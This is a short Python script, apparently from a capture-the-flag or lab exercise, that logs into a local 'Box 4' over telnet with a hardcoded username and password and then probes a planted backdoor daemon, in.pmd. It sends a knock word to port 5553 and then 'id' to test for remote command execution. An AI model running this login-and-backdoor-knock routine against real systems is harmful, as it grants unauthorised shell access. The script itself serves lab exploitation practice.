#!/usr/bin/env python3
"""Live diagnostic for Box 4: connect to the running box, foothold brian, and probe
the in.pmd backdoor knock — capture the FULL response of a few knock variants."""
import os, sys, time, pexpect
TP=os.environ.get("BOX_FWD_TELNET","2323")
def log(m): print(f"[diag4] {m}",file=sys.stderr,flush=True)
tn=pexpect.spawn(f"telnet 127.0.0.1 {TP}",encoding="latin-1",timeout=60)
tn.logfile_read=open("work/diag4-telnet.log","w",encoding="latin-1")
tn.expect(r"login:",timeout=60)
tn.sendline("brian"); tn.expect(r"[Pp]assword:",timeout=30); tn.sendline("newriver")
tn.expect([r"\$ ",r"% "],timeout=60)
tn.sendline("stty -echo 2>/dev/null"); tn.expect([r"\$ ",r"% "],timeout=30)
tn.sendline("PS1='D4> '; export PS1"); tn.expect(r"D4> ",timeout=30)
log("foothold OK")
def run(cmd,tmo=90):
    tn.sendline(cmd); tn.expect(r"D4> ",timeout=tmo); return tn.before
for label,cmd in [
  ("in.pmd bin",   "ls -l /usr/libexec/in.pmd; strings /usr/libexec/in.pmd | grep -i wank"),
  ("nc present",   "ls -l /usr/bin/nc /usr/local/bin/nc 2>&1; which nc 2>&1"),
  ("knock telnet", "( echo wank; sleep 2; echo id; echo PMDEND ) | telnet localhost 5553 2>&1"),
  ("knock -i sh?", "( echo wank; sleep 2; echo 'id; echo PMDEND2' ) | telnet localhost 5553 2>&1"),
]:
    out=run(cmd)
    lines=[l.rstrip() for l in out.splitlines() if l.strip() and "D4>" not in l]
    log(f"--- {label} ---")
    for l in lines[-16:]: print("    "+l,file=sys.stderr,flush=True)
sys.exit(0)
